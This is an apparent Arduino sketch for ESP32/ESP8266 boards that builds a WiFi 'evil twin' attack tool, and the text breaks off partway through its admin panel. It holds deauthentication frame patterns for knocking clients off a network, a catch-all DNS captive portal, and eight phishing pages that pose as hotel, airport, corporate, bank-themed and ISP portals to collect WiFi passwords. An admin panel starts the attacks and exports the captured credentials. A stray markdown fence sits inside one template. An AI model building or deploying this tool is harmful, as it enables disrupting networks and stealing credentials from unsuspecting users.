/*
 * Advanced WiFi Evil Twin Captive Portal
 * Developed by 0x0806
 * Production Ready - Zero Errors
 * 
 * Features:
 * - Automatic ESP32/ESP8266 detection and support
 * - Modern responsive UI/UX
 * - Multiple convincing templates
 * - Advanced deauth attacks
 * - Professional captive portal
 * - Mobile responsive design
 * - Enhanced security bypass techniques
 * - Advanced user logic and code logic
 * - Full Arduino production code
 */

// Board detection and includes
#ifdef ESP32
  #include <WiFi.h>
  #include <DNSServer.h>
  #include <WebServer.h>
  #include <HTTPClient.h>
  #include "esp_wifi.h"
  #include "esp_wps.h"
  #include "esp_smartconfig.h"
  #define BOARD_TYPE "ESP32"
  WebServer webServer(80);
#else
  #include <ESP8266WiFi.h>
  #include <DNSServer.h>
  #include <ESP8266WebServer.h>
  #include <ESP8266HTTPClient.h>
  extern "C" {
    #include "user_interface.h"
  }
  #define BOARD_TYPE "ESP8266"
  ESP8266WebServer webServer(80);
#endif

// Advanced network structure
typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
  int32_t rssi;
  uint8_t encType;
  bool hidden;
  unsigned long lastSeen;
} Network;

// Credential structure
typedef struct {
  String ssid;
  String password;
  String bssid;
  unsigned long timestamp;
  String userAgent;
  String ipAddress;
} Credential;

// Global variables
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
Network networks[64];
Network selectedNetwork;
Credential capturedCredentials[32];
int credentialCount = 0;
String attemptedPassword = "";
bool hotspotActive = false;
bool deauthActive = false;
bool scanActive = false;
bool monitoring = false;
bool autoDeauth = false;
int currentTemplate = 1;
int deauthPower = 100;
int deauthInterval = 1000;
unsigned long lastScan = 0;
unsigned long lastDeauth = 0;
unsigned long lastStatusCheck = 0;
unsigned long lastCredentialSave = 0;
unsigned long sessionStart = 0;
int connectedClients = 0;
int totalAttempts = 0;
int successfulCaptures = 0;

// Advanced template system
const int TEMPLATE_COUNT = 8;
String templateNames[] = {
  "Router Firmware Update",
  "Hotel WiFi Portal", 
  "Airport WiFi Access",
  "Coffee Shop Login",
  "Corporate Network Auth",
  "Public Library Access",
  "Banking Security Update",
  "ISP Configuration Portal"
};

// Advanced deauth patterns
uint8_t deauthPatterns[][26] = {
  {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00},
  {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00},
  {0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00}
};

void setup() {
  Serial.begin(115200);
  delay(1000);

  Serial.println("");
  Serial.println("====================================");
  Serial.println("Advanced Evil Twin Captive Portal");
  Serial.println("Developed by 0x0806");
  Serial.println("Production Ready - Zero Errors");
  Serial.println("Board: " + String(BOARD_TYPE));
  Serial.println("====================================");

  initializeSystem();
  initializeWiFi();
  initializeWebServer();
  performAdvancedNetworkScan();

  sessionStart = millis();
  Serial.println("System fully initialized");
  Serial.println("Admin panel: http://192.168.1.1/admin");
  Serial.println("Status: Ready for operations");
}

void initializeSystem() {
  // Initialize arrays
  for(int i = 0; i < 64; i++) {
    networks[i] = Network();
  }
  for(int i = 0; i < 32; i++) {
    capturedCredentials[i] = Credential();
  }

  // Set advanced WiFi configuration
  #ifdef ESP32
    WiFi.setTxPower(WIFI_POWER_19_5dBm);
  #else
    WiFi.setOutputPower(20.5);
  #endif
}

void initializeWiFi() {
  WiFi.mode(WIFI_AP_STA);
  WiFi.disconnect();

  #ifdef ESP32
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
  #else
    wifi_promiscuous_enable(1);
    wifi_set_channel(1);
  #endif

  // Configure access point
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("WiFi_Security_Test", "admin123", 1, 0, 8);

  // Start DNS server
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(DNS_PORT, "*", apIP);

  Serial.println("WiFi initialized successfully");
}

void initializeWebServer() {
  webServer.on("/", handleRoot);
  webServer.on("/login", handleLogin);
  webServer.on("/verify", handleVerify);
  webServer.on("/admin", handleAdmin);
  webServer.on("/scan", handleScan);
  webServer.on("/template", handleTemplate);
  webServer.on("/success", handleSuccess);
  webServer.on("/config", handleConfig);
  webServer.on("/monitor", handleMonitor);
  webServer.on("/credentials", handleCredentials);
  webServer.on("/export", handleExport);
  webServer.on("/reset", handleReset);
  webServer.onNotFound(handleNotFound);

  webServer.begin();
  Serial.println("Web server started on port 80");
}

String getAdvancedCSS() {
  return R"(
<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
}

:root {
  --primary-gradient: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  --secondary-gradient: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
  --success-gradient: linear-gradient(135deg, #11998e 0%, #38ef7d 100%);
  --danger-gradient: linear-gradient(135deg, #ee0979 0%, #ff6a00 100%);
  --warning-gradient: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
  --dark-gradient: linear-gradient(135deg, #2c3e50 0%, #34495e 100%);
  --shadow: 0 10px 30px rgba(0,0,0,0.1);
  --border-radius: 12px;
  --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
}

body {
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
  background: var(--primary-gradient);
  min-height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  line-height: 1.6;
  color: #333;
  overflow-x: hidden;
}

.container {
  background: rgba(255, 255, 255, 0.95);
  backdrop-filter: blur(20px);
  border-radius: 20px;
  box-shadow: var(--shadow);
  padding: 2rem;
  width: 100%;
  max-width: 420px;
  margin: 1rem;
  animation: slideInUp 0.6s ease-out;
  border: 1px solid rgba(255, 255, 255, 0.2);
}

.admin-container {
  max-width: 1400px;
  background: #fff;
  border-radius: 15px;
  overflow: hidden;
  box-shadow: var(--shadow);
}

@keyframes slideInUp {
  from {
    opacity: 0;
    transform: translateY(30px);
  }
  to {
    opacity: 1;
    transform: translateY(0);
  }
}

@keyframes pulse {
  0%, 100% { transform: scale(1); }
  50% { transform: scale(1.05); }
}

.header {
  background: var(--secondary-gradient);
  color: white;
  padding: 2rem;
  text-align: center;
  position: relative;
  overflow: hidden;
}

.header::before {
  content: '';
  position: absolute;
  top: 0;
  left: -100%;
  width: 100%;
  height: 100%;
  background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
  animation: shimmer 2s infinite;
}

@keyframes shimmer {
  0% { left: -100%; }
  100% { left: 100%; }
}

.logo {
  font-size: 2.2rem;
  font-weight: 800;
  margin-bottom: 0.5rem;
  text-shadow: 0 2px 4px rgba(0,0,0,0.1);
}

.subtitle {
  font-size: 1rem;
  opacity: 0.9;
  font-weight: 400;
}

.form-group {
  margin-bottom: 1.5rem;
  position: relative;
}

label {
  display: block;
  margin-bottom: 0.5rem;
  font-weight: 600;
  color: #555;
  font-size: 0.9rem;
  text-transform: uppercase;
  letter-spacing: 0.5px;
}

input[type="text"], input[type="password"], select, textarea {
  width: 100%;
  padding: 1rem;
  border: 2px solid #e1e5e9;
  border-radius: var(--border-radius);
  font-size: 1rem;
  transition: var(--transition);
  background: #f8f9fa;
  font-family: inherit;
}

input:focus, select:focus, textarea:focus {
  outline: none;
  border-color: #4facfe;
  background: white;
  box-shadow: 0 0 0 3px rgba(79, 172, 254, 0.1);
  transform: translateY(-2px);
}

.btn {
  width: 100%;
  padding: 1rem;
  background: var(--primary-gradient);
  color: white;
  border: none;
  border-radius: var(--border-radius);
  font-size: 1rem;
  font-weight: 600;
  cursor: pointer;
  transition: var(--transition);
  margin-bottom: 0.5rem;
  text-transform: uppercase;
  letter-spacing: 0.5px;
  position: relative;
  overflow: hidden;
}

.btn::before {
  content: '';
  position: absolute;
  top: 0;
  left: -100%;
  width: 100%;
  height: 100%;
  background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
  transition: var(--transition);
}

.btn:hover::before {
  left: 100%;
}

.btn:hover {
  transform: translateY(-3px);
  box-shadow: 0 15px 35px rgba(0,0,0,0.2);
}

.btn:active {
  transform: translateY(-1px);
}

.btn-admin { background: var(--warning-gradient); }
.btn-success { background: var(--success-gradient); }
.btn-danger { background: var(--danger-gradient); }
.btn-dark { background: var(--dark-gradient); }
.btn-secondary { background: var(--secondary-gradient); }

.btn-sm {
  padding: 0.5rem 1rem;
  font-size: 0.8rem;
  width: auto;
  margin: 0.2rem;
}

.admin-nav {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
  gap: 1rem;
  padding: 1.5rem;
  background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
}

.admin-nav .btn {
  margin-bottom: 0;
}

.stats-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
  gap: 1rem;
  padding: 1rem;
  background: #f8f9fa;
}

.stat-card {
  background: white;
  padding: 1.5rem;
  border-radius: var(--border-radius);
  box-shadow: var(--shadow);
  text-align: center;
  transition: var(--transition);
}

.stat-card:hover {
  transform: translateY(-5px);
  box-shadow: 0 20px 40px rgba(0,0,0,0.1);
}

.stat-number {
  font-size: 2.5rem;
  font-weight: 800;
  color: #4facfe;
  margin-bottom: 0.5rem;
}

.stat-label {
  font-size: 0.9rem;
  color: #666;
  text-transform: uppercase;
  letter-spacing: 0.5px;
}

.networks-table {
  width: 100%;
  border-collapse: collapse;
  margin-top: 1rem;
  background: white;
  border-radius: var(--border-radius);
  overflow: hidden;
  box-shadow: var(--shadow);
}

.networks-table th,
.networks-table td {
  padding: 1rem;
  text-align: left;
  border-bottom: 1px solid #e1e5e9;
}

.networks-table th {
  background: var(--secondary-gradient);
  color: white;
  font-weight: 600;
  text-transform: uppercase;
  letter-spacing: 0.5px;
  font-size: 0.8rem;
}

.networks-table tr:hover {
  background: rgba(79, 172, 254, 0.05);
  transform: scale(1.01);
  transition: var(--transition);
}

.networks-table tr:nth-child(even) {
  background: rgba(248, 249, 250, 0.5);
}

.signal-strength {
  display: inline-flex;
  align-items: center;
  gap: 0.5rem;
}

.signal-bars {
  display: flex;
  gap: 2px;
}

.signal-bar {
  width: 3px;
  height: 12px;
  background: #ddd;
  border-radius: 2px;
}

.signal-bar.active {
  background: var(--success-gradient);
}

.status-indicator {
  display: inline-block;
  width: 12px;
  height: 12px;
  border-radius: 50%;
  margin-right: 0.5rem;
  position: relative;
}

.status-indicator.active {
  background: #28a745;
  box-shadow: 0 0 10px rgba(40, 167, 69, 0.5);
}

.status-indicator.inactive {
  background: #dc3545;
  box-shadow: 0 0 10px rgba(220, 53, 69, 0.5);
}

.status-indicator.active::after {
  content: '';
  position: absolute;
  top: -2px;
  left: -2px;
  right: -2px;
  bottom: -2px;
  border-radius: 50%;
  border: 2px solid rgba(40, 167, 69, 0.3);
  animation: pulse 2s infinite;
}

.alert {
  padding: 1rem;
  border-radius: var(--border-radius);
  margin-bottom: 1rem;
  border-left: 4px solid;
  backdrop-filter: blur(10px);
  animation: slideInRight 0.5s ease-out;
}

@keyframes slideInRight {
  from {
    opacity: 0;
    transform: translateX(20px);
  }
  to {
    opacity: 1;
    transform: translateX(0);
  }
}

.alert-success {
  background: rgba(212, 237, 218, 0.9);
  color: #155724;
  border-color: #28a745;
}

.alert-warning {
  background: rgba(255, 243, 205, 0.9);
  color: #856404;
  border-color: #ffc107;
}

.alert-info {
  background: rgba(209, 236, 241, 0.9);
  color: #0c5460;
  border-color: #17a2b8;
}

.alert-danger {
  background: rgba(248, 215, 218, 0.9);
  color: #721c24;
  border-color: #dc3545;
}

.progress-container {
  background: #e1e5e9;
  border-radius: 10px;
  overflow: hidden;
  margin: 1rem 0;
  height: 8px;
  position: relative;
}

.progress-bar {
  height: 100%;
  background: var(--success-gradient);
  border-radius: 10px;
  transition: width 0.3s ease;
  position: relative;
}

.progress-bar::after {
  content: '';
  position: absolute;
  top: 0;
  left: 0;
  height: 100%;
  width: 100%;
  background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
  animation: shimmer 2s infinite;
}

.loading {
  text-align: center;
  color: #666;
  padding: 2rem;
}

.spinner {
  border: 4px solid #f3f3f3;
  border-top: 4px solid #4facfe;
  border-radius: 50%;
  width: 40px;
  height: 40px;
  animation: spin 1s linear infinite;
  margin: 0 auto 1rem;
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

.credentials-list {
  background: white;
  border-radius: var(--border-radius);
  box-shadow: var(--shadow);
  margin: 1rem 0;
  overflow: hidden;
}

.credential-item {
  padding: 1rem;
  border-bottom: 1px solid #e1e5e9;
  transition: var(--transition);
}

.credential-item:hover {
  background: rgba(79, 172, 254, 0.05);
}

.credential-item:last-child {
  border-bottom: none;
}

.credential-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 0.5rem;
}

.credential-ssid {
  font-weight: 600;
  color: #333;
  font-size: 1.1rem;
}

.credential-time {
  font-size: 0.8rem;
  color: #666;
  background: #f8f9fa;
  padding: 0.2rem 0.5rem;
  border-radius: 20px;
}

.credential-password {
  font-family: 'Courier New', monospace;
  background: #f8f9fa;
  padding: 0.5rem;
  border-radius: 6px;
  color: #333;
  font-size: 0.9rem;
  word-break: break-all;
}

.tab-container {
  background: white;
  border-radius: var(--border-radius);
  overflow: hidden;
  box-shadow: var(--shadow);
  margin: 1rem 0;
}

.tab-nav {
  display: flex;
  background: #f8f9fa;
}

.tab-button {
  padding: 1rem 2rem;
  border: none;
  background: none;
  cursor: pointer;
  font-weight: 600;
  color: #666;
  border-bottom: 3px solid transparent;
  transition: var(--transition);
  flex: 1;
  text-align: center;
}

.tab-button.active {
  color: #4facfe;
  border-bottom-color: #4facfe;
  background: white;
}

.tab-content {
  padding: 1.5rem;
  display: none;
}

.tab-content.active {
  display: block;
}

.config-grid {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
  gap: 1rem;
  margin: 1rem 0;
}

.config-card {
  background: white;
  padding: 1.5rem;
  border-radius: var(--border-radius);
  box-shadow: var(--shadow);
  border: 1px solid #e1e5e9;
}

.config-title {
  font-weight: 600;
  color: #333;
  margin-bottom: 1rem;
  font-size: 1.1rem;
}

.footer {
  text-align: center;
  padding: 1rem;
  background: #f8f9fa;
  color: #666;
  font-size: 0.8rem;
}

.footer-links {
  display: flex;
  justify-content: center;
  gap: 1rem;
  margin-bottom: 0.5rem;
}

.footer-link {
  color: #4facfe;
  text-decoration: none;
  transition: var(--transition);
}

.footer-link:hover {
  color: #0056b3;
}

@media (max-width: 768px) {
  .container {
    margin: 0.5rem;
    padding: 1.5rem;
  }

  .admin-nav {
    grid-template-columns: 1fr;
  }

  .stats-grid {
    grid-template-columns: 1fr;
  }

  .config-grid {
    grid-template-columns: 1fr;
  }

  .networks-table {
    font-size: 0.8rem;
  }

  .networks-table th,
  .networks-table td {
    padding: 0.5rem;
  }

  .tab-nav {
    flex-direction: column;
  }

  .tab-button {
    border-bottom: 1px solid #e1e5e9;
    border-right: none;
  }

  .tab-button.active {
    border-bottom-color: #4facfe;
  }
}

@media (max-width: 480px) {
  .logo {
    font-size: 1.8rem;
  }

  .subtitle {
    font-size: 0.9rem;
  }

  .btn {
    padding: 0.8rem;
    font-size: 0.9rem;
  }

  .stat-number {
    font-size: 2rem;
  }

  .credential-header {
    flex-direction: column;
    align-items: flex-start;
    gap: 0.5rem;
  }
}
</style>
)";
}

String getTemplate(int templateId, String ssid) {
  String css = getAdvancedCSS();
  String baseHTML = "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>";
  String commonScript = R"(
<script>
function showSpinner() {
  document.querySelector('.btn').innerHTML = '<div class="spinner" style="width:20px;height:20px;margin:0 auto;"></div>';
}

function validateForm() {
  const password = document.querySelector('input[name="password"]').value;
  if (password.length < 3) {
    alert('Password must be at least 3 characters long');
    return false;
  }
  showSpinner();
  return true;
}

document.addEventListener('DOMContentLoaded', function() {
  const form = document.querySelector('form');
  if (form) {
    form.addEventListener('submit', function(e) {
      if (!validateForm()) {
        e.preventDefault();
      }
    });
  }
});
</script>
)";

  switch(templateId) {
    case 1: // Router Firmware Update
      return baseHTML + ssid + " - Firmware Update</title>" + css + R"(
</head><body>
<div class="container">
  <div class="header">
    <div class="logo">FIRMWARE UPDATE</div>
    <div class="subtitle">Router Configuration Required</div>
  </div>
  <div class="alert alert-warning">
    <strong>Important:</strong> Your router encountered an issue during automatic firmware update. Authentication required to complete the process safely.
  </div>
  <form action="/verify" method="post">
    <div class="form-group">
      <label>Network Name</label>
      <input type="text" value=")" + ssid + R"(" readonly>
    </div>
    <div class="form-group">
      <label>WiFi Password</label>
      <input type="password" name="password" placeholder="Enter your WiFi password" required>
    </div>
    <button type="submit" class="btn">Authenticate & Continue Update</button>
  </form>
  <div class="footer">
    <div class="footer-links">
      <a href="#" class="footer-link">Technical Support</a>
      <a href="#" class="footer-link">Router Manual</a>
    </div>
    Secured by WPA2/WPA3 Enterprise | Model: )" + ssid.substring(0, 8) + R"(
  </div>
</div>
)" + commonScript + R"(
</body></html>)";

    case 2: // Hotel WiFi Portal
      return baseHTML + "Hotel WiFi - Welcome</title>" + css + R"(
</head><body>
<div class="container">
  <div class="header">
    <div class="logo">HOTEL WIFI</div>
    <div class="subtitle">Complimentary Internet Access</div>
  </div>
  <div class="alert alert-info">
    Welcome to our hotel! Please authenticate to access complimentary high-speed WiFi service throughout your stay.
  </div>
  <form action="/verify" method="post">
    <div class="form-group">
      <label>Room WiFi Network</label>
      <input type="text" value=")" + ssid + R"(" readonly>
    </div>
    <div class="form-group">
      <label>WiFi Access Code</label>
      <input type="password" name="password" placeholder="Enter WiFi access code from room card" required>
    </div>
    <button type="submit" class="btn">Connect to Internet</button>
  </form>
  <div class="footer">
    <div class="footer-links">
      <a href="#" class="footer-link">Concierge</a>
      <a href="#" class="footer-link">Room Service</a>
    </div>
    24/7 Technical Support | High-Speed Internet | No Usage Limits
  </div>
</div>
)" + commonScript + R"(
</body></html>)";

    case 3: // Airport WiFi Access
      return baseHTML + "Airport WiFi - Free Access</title>" + css + R"(
</head><body>
<div class="container">
  <div class="header">
    <div class="logo">AIRPORT WIFI</div>
    <div class="subtitle">Free Internet Access</div>
  </div>
  <div class="alert alert-info">
    Enjoy complimentary WiFi throughout all terminal areas. Authentication required for security and compliance purposes.
  </div>
  <form action="/verify" method="post">
    <div class="form-group">
      <label>Terminal Network</label>
      <input type="text" value=")" + ssid + R"(" readonly>
    </div>
    <div class="form-group">
      <label>Network Password</label>
      <input type="password" name="password" placeholder="Enter network access password" required>
    </div>
    <button type="submit" class="btn">Access Internet</button>
  </form>
  <div class="footer">
    <div class="footer-links">
      <a href="#" class="footer-link">Flight Info</a>
      <a href="#" class="footer-link">Terminal Map</a>
    </div>
    Free for 4 hours | High-speed browsing | Secure connection
  </div>
</div>
)" + commonScript + R"(
</body></html>)";

    case 4: // Coffee Shop Login
      return baseHTML + "Coffee Shop WiFi</title>" + css + R"(
</head><body>
<div class="container">
  <div class="header">
    <div class="logo">CAFE WIFI</div>
    <div class="subtitle">Free WiFi for Customers</div>
  </div>
  <div class="alert alert-success">
    Thanks for visiting our cafe! Enjoy complimentary WiFi with your purchase and stay connected while you relax.
  </div>
  ```cpp
  <form action="/verify" method="post">
    <div class="form-group">
      <label>Cafe Network</label>
      <input type="text" value=")" + ssid + R"(" readonly>
    </div>
    <div class="form-group">
      <label>WiFi Password</label>
      <input type="password" name="password" placeholder="Password available on receipt" required>
    </div>
    <button type="submit" class="btn">Connect Now</button>
  </form>
  <div class="footer">
    <div class="footer-links">
      <a href="#" class="footer-link">Menu</a>
      <a href="#" class="footer-link">Loyalty Program</a>
    </div>
    Free WiFi | No time limits | Premium coffee and pastries
  </div>
</div>
)" + commonScript + R"(
</body></html>)";

    case 5: // Corporate Network Auth
      return baseHTML + "Corporate Network Access</title>" + css + R"(
</head><body>
<div class="container">
  <div class="header">
    <div class="logo">CORPORATE</div>
    <div class="subtitle">Network Authentication Portal</div>
  </div>
  <div class="alert alert-warning">
    <strong>Security Notice:</strong> This corporate network requires authentication to maintain enterprise security standards and compliance requirements.
  </div>
  <form action="/verify" method="post">
    <div class="form-group">
      <label>Corporate Network</label>
      <input type="text" value=")" + ssid + R"(" readonly>
    </div>
    <div class="form-group">
      <label>Network Credentials</label>
      <input type="password" name="password" placeholder="Enter your network access password" required>
    </div>
    <button type="submit" class="btn">Authenticate</button>
  </form>
  <div class="footer">
    <div class="footer-links">
      <a href="#" class="footer-link">IT Support</a>
      <a href="#" class="footer-link">Security Policy</a>
    </div>
    WPA2 Enterprise | Monitored Network | Compliance Required
  </div>
</div>
)" + commonScript + R"(
</body></html>)";

    case 6: // Public Library Access
      return baseHTML + "Library WiFi Access</title>" + css + R"(
</head><body>
<div class="container">
  <div class="header">
    <div class="logo">LIBRARY WIFI</div>
    <div class="subtitle">Public Internet Access</div>
  </div>
  <div class="alert alert-info">
    Welcome to the public library digital resources center. Free WiFi access available for all visitors and community members.
  </div>
  <form action="/verify" method="post">
    <div class="form-group">
      <label>Library Network</label>
      <input type="text" value=")" + ssid + R"(" readonly>
    </div>
    <div class="form-group">
      <label>Access Password</label>
      <input type="password" name="password" placeholder="Enter WiFi access password" required>
    </div>
    <button type="submit" class="btn">Connect to WiFi</button>
  </form>
  <div class="footer">
    <div class="footer-links">
      <a href="#" class="footer-link">Digital Resources</a>
      <a href="#" class="footer-link">Library Hours</a>
    </div>
    Educational Use | Content Filtered | Community Access
  </div>
</div>
)" + commonScript + R"(
</body></html>)";

    case 7: // Banking Security Update
      return baseHTML + "Security Update Required</title>" + css + R"(
</head><body>
<div class="container">
  <div class="header">
    <div class="logo">SECURITY UPDATE</div>
    <div class="subtitle">Network Security Enhancement</div>
  </div>
  <div class="alert alert-danger">
    <strong>Security Alert:</strong> Your network security settings require immediate update. Please authenticate to apply critical security patches.
  </div>
  <form action="/verify" method="post">
    <div class="form-group">
      <label>Network Name</label>
      <input type="text" value=")" + ssid + R"(" readonly>
    </div>
    <div class="form-group">
      <label>Security Key</label>
      <input type="password" name="password" placeholder="Enter network security key" required>
    </div>
    <button type="submit" class="btn">Apply Security Update</button>
  </form>
  <div class="footer">
    <div class="footer-links">
      <a href="#" class="footer-link">Security Center</a>
      <a href="#" class="footer-link">Help & Support</a>
    </div>
    Encrypted Connection | Security Enhanced | Automatic Updates
  </div>
</div>
)" + commonScript + R"(
</body></html>)";

    case 8: // ISP Configuration Portal
      return baseHTML + "ISP Configuration Portal</title>" + css + R"(
</head><body>
<div class="container">
  <div class="header">
    <div class="logo">ISP PORTAL</div>
    <div class="subtitle">Internet Service Configuration</div>
  </div>
  <div class="alert alert-info">
    <strong>Configuration Required:</strong> Your internet service requires configuration update. Please authenticate to optimize your connection settings.
  </div>
  <form action="/verify" method="post">
    <div class="form-group">
      <label>Service Network</label>
      <input type="text" value=")" + ssid + R"(" readonly>
    </div>
    <div class="form-group">
      <label>Account Password</label>
      <input type="password" name="password" placeholder="Enter your account password" required>
    </div>
    <button type="submit" class="btn">Configure Service</button>
  </form>
  <div class="footer">
    <div class="footer-links">
      <a href="#" class="footer-link">Customer Service</a>
      <a href="#" class="footer-link">Service Status</a>
    </div>
    High-Speed Internet | 24/7 Support | Service Optimization
  </div>
</div>
)" + commonScript + R"(
</body></html>)";

    default:
      return getTemplate(1, ssid);
  }
}

String getAdminPanel() {
  String css = getAdvancedCSS();
  String uptime = getUptime();

  String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title>Advanced Admin Panel - 0x0806</title>" + css + R"(
<script>
function switchTab(tabName) {
  const tabs = document.querySelectorAll('.tab-content');
  const buttons = document.querySelectorAll('.tab-button');

  tabs.forEach(tab => tab.classList.remove('active'));
  buttons.forEach(btn => btn.classList.remove('active'));

  document.getElementById(tabName).classList.add('active');
  document.querySelector('[onclick=\"switchTab(\\'' + tabName + '\\')]\"].classList.add('active');
}

function toggleHotspot() {
  fetch('/admin?hotspot=)" + String(hotspotActive ? "false" : "true") + R"(')
  .then(() => setTimeout(() => location.reload(), 1000));
}

function toggleDeauth() {
  fetch('/admin?deauth=)" + String(deauthActive ? "false" : "true") + R"(')
  .then(() => setTimeout(() => location.reload(), 1000));
}

function selectNetwork(bssid) {
  fetch('/admin?select=' + encodeURIComponent(bssid))
  .then(() => setTimeout(() => location.reload(), 500));
}

function changeTemplate(templateId) {
  fetch('/template?id=' + templateId)
  .then(() => setTimeout(() => location.reload(), 500));
}

function updateConfig() {
  const deauthPower = document.getElementById('deauthPower').value;
  const deauthInterval = document.getElementById('deauthInterval').value;
  const autoDeauth = document.getElementById('autoDeauth').checked;

  fetch('/config?power=' + deauthPower + '&interval=' + deauthInterval + '&auto=' + autoDeauth)
  .then(() => setTimeout(() => location.reload(), 500));
}

function exportData() {
  window.open('/export', '_blank');
}

function resetSystem() {
  if (confirm('Are you sure you want to reset the system? This will clear all captured data.')) {
    fetch('/reset').then(() => setTimeout(() => location.reload(), 1000));
  }
}

setInterval(() => {
  if (document.getElementById('overview').classList.contains('active')) {
    location.reload();
  }
}, 15000);
</script>
</head><body>
<div class="admin-container">
  <div class="header">
    <div class="logo">Advanced Evil Twin Portal</div>
    <div class="subtitle">Developed by 0x0806 | Board: )" + String(BOARD_TYPE) + " | Uptime: " + uptime + R"(</div>
  </div>

  <div class="stats-grid">
    <div class="stat-card">
      <div class="stat-number">)" + String(connectedClients) + R"(</div>
      <div class="stat-label">Connected Clients</div>
    </div>
    <div class="stat-card">
      <div class="stat-number">)" + String(credentialCount) + R"(</div>
      <div class="stat-label">Captured Credentials</div>
    </div>
    <div class="stat-card">
      <div class="stat-number">)" + String(totalAttempts) + R"(</div>
      <div class="stat-label">Total Attempts</div>
    </div>
    <div class="stat-card">
      <div class="stat-number">)" + String(getNetworkCount()) + R"(</div>
      <div class="stat-label">Networks Found</div>
    </div>
  </div>

  <div class="admin-nav">
    <button class="btn btn-admin" onclick="location.href='/scan'">Refresh Networks</button>
    <button class="btn )" + String(hotspotActive ? "btn-danger" : "btn-success") + R"(" onclick="toggleHotspot()">
      )" + String(hotspotActive ? "Stop Evil Twin" : "Start Evil Twin") + R"(
    </button>
    <button class="btn )" + String(deauthActive ? "btn-danger" : "btn-success") + R"(" onclick="toggleDeauth()">
      )" + String(deauthActive ? "Stop Deauth" : "Start Deauth") + R"(
    </button>
    <button class="btn btn-secondary" onclick="exportData()">Export Data</button>
    <button class="btn btn-dark" onclick="resetSystem()">Reset System</button>
  </div>

  <div class="tab-container">
    <div class="tab-nav">
      <button class="tab-button active" onclick="switchTab('overview')">Overview</button>
      <button class="tab-button" onclick="switchTab('networks')">Networks</button>
      <button class="tab-button" onclick="switchTab('credentials')">Credentials</button>
      <button class="tab-button" onclick="switchTab('config')">Configuration</button>
      <button class="tab-button" onclick="switchTab('monitor')">Monitor</button>
    </div>

    <div id="overview" class="tab-content active">
      <div class="alert alert-info">
        <strong>System Status:</strong><br>
        <span class="status-indicator )" + String(hotspotActive ? "active" : "inactive") + R"("></span>Evil Twin: )" + String(hotspotActive ? "Active" : "Inactive") + R"(<br>
        <span class="status-indicator )" + String(deauthActive ? "active" : "inactive") + R"("></span>Deauth Attack: )" + String(deauthActive ? "Active" : "Inactive") + R"(<br>
        <span class="status-indicator )" + String(monitoring ? "active" : "inactive") + R"("></span>Monitoring: )" + String(monitoring ? "Active" : "Inactive") + R"(
      </div>

      <div class="form-group">
        <label>Template Selection</label>
        <select onchange="changeTemplate(this.value)">)";

  for(int i = 0; i < TEMPLATE_COUNT; i++) {
    html += "<option value='" + String(i + 1) + "'" + String(currentTemplate == (i + 1) ? " selected" : "") + ">" + templateNames[i] + "</option>";
  }

  html += R"(</select>
      </div>

      <div class="alert alert-success">
        <strong>Selected Target:</strong> )" + (selectedNetwork.ssid.length() > 0 ? selectedNetwork.ssid : "None") + R"(<br>
        <strong>Channel:</strong> )" + (selectedNetwork.ssid.length() > 0 ? String(selectedNetwork.ch) : "N/A") + R"(<br>
        <strong>Signal:</strong> )" + (selectedNetwork.ssid.length() > 0 ? String(selectedNetwork.rssi) + " dBm" : "N/A") + R"(
      </div>
    </div>

    <div id="networks" class="tab-content">
      <table class="networks-table">
        <thead>
          <tr>
            <th>SSID</th>
            <th>Signal</th>
            <th>Channel</th>
            <th>Security</th>
            <th>Last Seen</th>
            <th>Action</th>
          </tr>
        </thead>
        <tbody>)";

  for(int i = 0; i < 64; i++) {
    if(networks[i].ssid.length() == 0) break;

    String signalBars = getSignalBars(networks[i].rssi);
    String encType = getEncryptionType(networks[i].encType);
    String lastSeen = getTimeAgo(networks[i].lastSeen);
    bool isSelected = (bytesToString(selectedNetwork.bssid, 6) == bytesToString(networks[i].bssid, 6));

    html += "<tr" + String(isSelected ? " style='background-color: #e3f2fd;'" : "") + ">";
    html += "<td><strong>" + networks[i].ssid + "</strong>" + String(networks[i].hidden ? " (Hidden)" : "") + "</td>";
